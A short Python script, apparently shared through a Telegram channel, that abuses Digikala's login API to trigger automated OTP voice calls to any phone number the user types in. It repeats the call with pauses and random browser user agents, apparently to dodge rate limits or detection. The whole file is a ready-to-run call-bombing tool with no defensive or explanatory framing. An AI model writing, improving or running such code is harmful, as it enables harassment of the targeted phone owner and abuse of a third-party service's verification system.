#by t.me @M0_1R
import requests
import time
from fake_useragent import UserAgent

url = "https://api.digikala.com/v1/user/authenticate/"
username = input("phone:")

for i in range(3):
    ua = UserAgent()
    random_user_agent = ua.random
    headers = {
        "Host": "api.digikala.com",
        "User-Agent": random_user_agent,
        "X-Web-Client": "desktop",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "X-Web-Optimize-Response": "1",
        "Origin": "https://www.digikala.com",
        "Referer": "https://www.digikala.com/",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }
    data = {
        "backUrl": "/",
        "username": username,
        "otp_call": True
    }
    response = requests.post(url, json=data, headers=headers)
    print(f"{i+1} send Call✅")
    if i < 2:
        print("With...⏳")
        time.sleep(180)

print("Done🎯")
